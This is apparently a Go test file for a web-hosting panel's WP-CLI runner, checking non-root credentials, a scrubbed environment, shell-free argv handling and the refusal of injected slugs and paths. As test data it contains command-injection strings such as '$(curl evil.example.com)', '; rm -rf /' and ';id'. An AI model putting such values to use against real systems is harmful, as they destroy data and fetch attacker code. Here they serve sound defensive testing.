package wpcli

import (
	"context"
	"errors"
	"os/exec"
	"strings"
	"testing"

	"go.uber.org/zap"
)

// nonRoot is an ordinary site identity.
func nonRoot() Identity {
	return Identity{Name: "site-example", Group: "site-example", UID: 1201, GID: 1201}
}

// TestTheProcessIsGivenANonRootCredential is the enforcement test for the
// task's fourth WordPress requirement. It asserts on the exec.Cmd the runner
// would launch: SysProcAttr.Credential carries the site's uid and gid, the
// supplementary group list is replaced rather than inherited from the root
// panel process, and no --allow-root reaches the argv.
func TestTheProcessIsGivenANonRootCredential(t *testing.T) {
	var captured *exec.Cmd
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(_ context.Context, cmd *exec.Cmd) (*Result, error) {
		captured = cmd
		return &Result{Stdout: "[]"}, nil
	}

	identity := nonRoot()
	if _, err := runner.Run(context.Background(), Command{
		Identity: identity,
		Dir:      "/vkai-panel/www/domains/example.com",
		Args:     []string{"plugin", "list", "--format=json"},
	}); err != nil {
		t.Fatalf("a legitimate command was refused: %v", err)
	}

	if captured == nil {
		t.Fatal("no process was prepared")
	}
	if captured.SysProcAttr == nil || captured.SysProcAttr.Credential == nil {
		t.Fatal("the process has no Credential: it would run as the panel, which is root")
	}
	credential := captured.SysProcAttr.Credential
	if credential.Uid != identity.UID || credential.Gid != identity.GID {
		t.Fatalf("the process would run as uid %d gid %d, want %d/%d",
			credential.Uid, credential.Gid, identity.UID, identity.GID)
	}
	if credential.Uid == 0 || credential.Gid == 0 {
		t.Fatal("the process would run as root")
	}
	if credential.NoSetGroups {
		t.Fatal("NoSetGroups is set, so the child keeps the root panel process's supplementary " +
			"groups; setgroups(2) must be called to replace them")
	}
	if len(credential.Groups) != 1 || credential.Groups[0] != identity.GID {
		t.Fatalf("the supplementary group list is %v, want exactly the site's own gid",
			credential.Groups)
	}

	// The working directory is the site, so a relative path in a plugin cannot
	// resolve against the panel's own directory.
	if captured.Dir != "/vkai-panel/www/domains/example.com" {
		t.Fatalf("the working directory is %q", captured.Dir)
	}

	// No --allow-root, ever.
	for _, arg := range captured.Args {
		if strings.Contains(arg, "allow-root") {
			t.Fatalf("the argv contains %q", arg)
		}
	}

	// The panel's environment holds the database password, the JWT secret and
	// the panel master key. None of it may reach a customer's PHP process.
	for _, entry := range captured.Env {
		name, _, _ := strings.Cut(entry, "=")
		switch name {
		case "PATH", "HOME", "LANG", "LC_ALL", "WP_CLI_CACHE_DIR",
			"WP_CLI_DISABLE_AUTO_CHECK_UPDATE":
		default:
			t.Errorf("the child process would inherit the environment variable %q", name)
		}
	}
}

// TestTheArgvIsAVectorAndTheresNoShell: the whole command is a []string handed
// to exec, never a string handed to sh.
func TestTheArgvIsAVectorAndTheresNoShell(t *testing.T) {
	var captured *exec.Cmd
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(_ context.Context, cmd *exec.Cmd) (*Result, error) {
		captured = cmd
		return &Result{}, nil
	}

	// A search-replace whose operands are full of shell syntax. Because there
	// is no shell, these are literal strings to search for - and that is the
	// property being asserted.
	from := "https://old.example.com; rm -rf /"
	to := "$(curl evil.example.com)"
	if _, err := runner.Run(context.Background(), Command{
		Identity: nonRoot(),
		Dir:      "/vkai-panel/www/domains/example.com",
		Args:     []string{"search-replace", from, to, "--precise"},
	}); err != nil {
		t.Fatal(err)
	}

	if captured.Path != "/usr/local/bin/wp" && !strings.HasSuffix(captured.Path, "/wp") {
		t.Fatalf("the executable is %q, not the wp binary", captured.Path)
	}
	for _, banned := range []string{"sh", "bash", "/bin/sh", "-c"} {
		for _, arg := range captured.Args {
			if arg == banned {
				t.Fatalf("the argv contains %q; the command is going through a shell", banned)
			}
		}
	}
	// The operands survive intact as SINGLE argv elements, which is what makes
	// them harmless.
	foundFrom, foundTo := false, false
	for _, arg := range captured.Args {
		if arg == from {
			foundFrom = true
		}
		if arg == to {
			foundTo = true
		}
	}
	if !foundFrom || !foundTo {
		t.Fatalf("the search-replace operands were not passed as single argv elements: %v",
			captured.Args)
	}
	if captured.Args[len(captured.Args)-2] != "--path=/vkai-panel/www/domains/example.com" {
		t.Fatalf("the --path argument is missing or wrong: %v", captured.Args)
	}
}

// TestRunRefusesEveryRootIdentity is the layer that survives a bug anywhere
// else. A zero-valued Identity has UID 0, so a caller that forgot to resolve
// one gets a refusal rather than a root WP-CLI run.
func TestRunRefusesEveryRootIdentity(t *testing.T) {
	launched := false
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(context.Context, *exec.Cmd) (*Result, error) {
		launched = true
		return &Result{}, nil
	}

	cases := []struct {
		name     string
		identity Identity
	}{
		{"the zero value, which a caller gets by forgetting to resolve one", Identity{}},
		{"uid 0", Identity{Name: "site", Group: "site", UID: 0, GID: 1201}},
		{"gid 0", Identity{Name: "site", Group: "root", UID: 1201, GID: 0}},
		{"named root with a non-zero uid", Identity{Name: "root", Group: "site", UID: 1201, GID: 1201}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			_, err := runner.Run(context.Background(), Command{
				Identity: tc.identity,
				Dir:      "/vkai-panel/www/domains/example.com",
				Args:     []string{"plugin", "list"},
			})
			var wouldBeRoot *ErrWouldRunAsRoot
			if !errors.As(err, &wouldBeRoot) {
				t.Fatalf("Run returned %v, want ErrWouldRunAsRoot", err)
			}
			if launched {
				t.Fatal("a process was launched anyway")
			}
			if !strings.Contains(err.Error(), "must never run with root privileges") {
				t.Fatalf("the refusal does not explain itself: %v", err)
			}
		})
	}
}

// TestAllowRootCanNeverBeSmuggledIntoTheArgv is layer three: even if layers one
// and two were both broken, WP-CLI itself refuses to run as root unless this
// flag is passed, and it can never be passed.
func TestAllowRootCanNeverBeSmuggledIntoTheArgv(t *testing.T) {
	launched := false
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(context.Context, *exec.Cmd) (*Result, error) {
		launched = true
		return &Result{}, nil
	}
	for _, arg := range []string{"--allow-root", "--allow-root=1"} {
		_, err := runner.Run(context.Background(), Command{
			Identity: nonRoot(),
			Dir:      "/vkai-panel/www/domains/example.com",
			Args:     []string{"plugin", "list", arg},
		})
		if err == nil {
			t.Fatalf("%q was accepted into the argv", arg)
		}
		if launched {
			t.Fatal("a process was launched with --allow-root")
		}
		if !strings.Contains(err.Error(), "never passed by this panel") {
			t.Fatalf("the refusal does not explain itself: %v", err)
		}
	}
}

// TestLookupIdentityRefusesRootByName covers the resolution layer.
func TestLookupIdentityRefusesRootByName(t *testing.T) {
	if _, err := LookupIdentity("root"); err == nil {
		t.Fatal("LookupIdentity resolved root")
	} else {
		var wouldBeRoot *ErrWouldRunAsRoot
		if !errors.As(err, &wouldBeRoot) {
			t.Fatalf("LookupIdentity returned %v, want ErrWouldRunAsRoot", err)
		}
	}
	// A name that is shell syntax never reaches the passwd database.
	for _, name := range []string{"site; id", "site\nroot", "../root", "-r", ""} {
		if _, err := LookupIdentity(name); err == nil {
			t.Errorf("LookupIdentity accepted %q", name)
		}
	}
}

// TestRunRefusesAPathOutsideTheGrammar: the directory is an argv element too.
func TestRunRefusesABadDirectory(t *testing.T) {
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(context.Context, *exec.Cmd) (*Result, error) {
		t.Fatal("a process was launched with a bad directory")
		return nil, nil
	}
	for _, dir := range []string{"", "relative", "/var/www/../../etc", "/var/www/$(id)"} {
		if _, err := runner.Run(context.Background(), Command{
			Identity: nonRoot(), Dir: dir, Args: []string{"plugin", "list"},
		}); err == nil {
			t.Errorf("Run accepted the directory %q", dir)
		}
	}
}

// TestIdentityStringIsTheAnswerToWhichUserDidThatRunAs. The panel has to be
// able to say it, so the string has to carry the name, the group and the
// numeric ids - a name alone is ambiguous after a user is recreated.
func TestIdentityStringIsTheAnswerToWhichUserDidThatRunAs(t *testing.T) {
	got := nonRoot().String()
	for _, part := range []string{"site-example", "uid 1201", "gid 1201"} {
		if !strings.Contains(got, part) {
			t.Errorf("the identity string %q does not contain %q", got, part)
		}
	}
}

// TestClientRefusesInvalidSlugsBeforeAnyProcessStarts proves the typed
// constructors are actually wired into the operations, not merely present.
func TestClientRefusesInvalidSlugsBeforeAnyProcessStarts(t *testing.T) {
	launched := false
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(context.Context, *exec.Cmd) (*Result, error) {
		launched = true
		return &Result{Stdout: "[]"}, nil
	}
	client := NewClient(runner, zap.NewNop())
	site := Site{Dir: "/vkai-panel/www/domains/example.com", Identity: nonRoot(), URL: "https://example.com"}

	if _, err := client.UpdatePlugins(context.Background(), site, []string{"woo;rm -rf /"}); err == nil {
		t.Error("UpdatePlugins accepted a slug containing shell syntax")
	}
	if _, err := client.InstallPlugin(context.Background(), site, "--allow-root", "", false); err == nil {
		t.Error("InstallPlugin accepted an option as a slug")
	}
	if _, err := client.InstallTheme(context.Background(), site, "theme\nname", "", false); err == nil {
		t.Error("InstallTheme accepted a slug containing a newline")
	}
	if _, err := client.ResetUserPassword(context.Background(), site, "admin;id", ""); err == nil {
		t.Error("ResetUserPassword accepted a login containing shell syntax")
	}
	if launched {
		t.Fatal("a process was launched for one of the refused commands")
	}
}

// TestSearchReplaceIsSerialisationSafe. A WordPress database stores serialised
// PHP arrays whose element lengths are encoded in the string; a plain SQL
// REPLACE corrupts every one of them. --precise is what makes WP-CLI
// unserialise, replace and reserialise instead, and its absence is a silent
// data-corruption bug, so it is asserted.
func TestSearchReplaceIsSerialisationSafe(t *testing.T) {
	var captured *exec.Cmd
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(_ context.Context, cmd *exec.Cmd) (*Result, error) {
		captured = cmd
		return &Result{Stdout: "[]"}, nil
	}
	client := NewClient(runner, zap.NewNop())
	site := Site{Dir: "/vkai-panel/www/domains/example.com", Identity: nonRoot(), URL: "https://example.com"}

	if _, err := client.SearchReplace(context.Background(), site,
		"https://old.example.com", "https://example.com", true); err != nil {
		t.Fatal(err)
	}
	argv := strings.Join(captured.Args, " ")
	for _, required := range []string{"--precise", "--recurse-objects", "--all-tables-with-prefix", "--dry-run"} {
		if !strings.Contains(argv, required) {
			t.Errorf("search-replace was run without %s: %v", required, captured.Args)
		}
	}

	// And the same call without a dry run must NOT carry --dry-run.
	if _, err := client.SearchReplace(context.Background(), site,
		"https://old.example.com", "https://example.com", false); err != nil {
		t.Fatal(err)
	}
	if strings.Contains(strings.Join(captured.Args, " "), "--dry-run") {
		t.Error("a live search-replace was run as a dry run")
	}
}

// TestSearchReplaceRefusesANoOp. Replacing a value with itself rewrites every
// row of the database for nothing, and is nearly always a mistake in a form.
func TestSearchReplaceRefusesANoOp(t *testing.T) {
	runner := &Runner{Binary: "/usr/local/bin/wp"}
	runner.exec = func(context.Context, *exec.Cmd) (*Result, error) {
		t.Fatal("a no-op search-replace was executed")
		return nil, nil
	}
	client := NewClient(runner, zap.NewNop())
	site := Site{Dir: "/vkai-panel/www/domains/example.com", Identity: nonRoot(), URL: "https://example.com"}
	if _, err := client.SearchReplace(context.Background(), site, "same", "same", false); err == nil {
		t.Fatal("a search-replace from a value to itself was accepted")
	}
}

// TestGeneratedMaterialIsRandomAndLongEnough. Salts fetched from a host with no
// outbound access silently become the placeholders in wp-config-sample.php,
// which is a site whose auth cookies anyone can forge; these are generated
// locally instead, so their quality is asserted here.
func TestGeneratedMaterialIsRandomAndLongEnough(t *testing.T) {
	seen := map[string]bool{}
	for i := 0; i < 200; i++ {
		salt, err := GenerateSalt(64)
		if err != nil {
			t.Fatal(err)
		}
		if len(salt) != 64 {
			t.Fatalf("a salt is %d characters, want 64", len(salt))
		}
		if seen[salt] {
			t.Fatal("two generated salts were identical")
		}
		seen[salt] = true
	}
	password, err := GeneratePassword(24)
	if err != nil {
		t.Fatal(err)
	}
	if len(password) != 24 {
		t.Fatalf("a generated password is %d characters, want 24", len(password))
	}
	// The password alphabet omits the characters an operator misreads when
	// copying by hand.
	if strings.ContainsAny(password, "lIO01") {
		t.Fatalf("the generated password %q contains an easily misread character", password)
	}
}
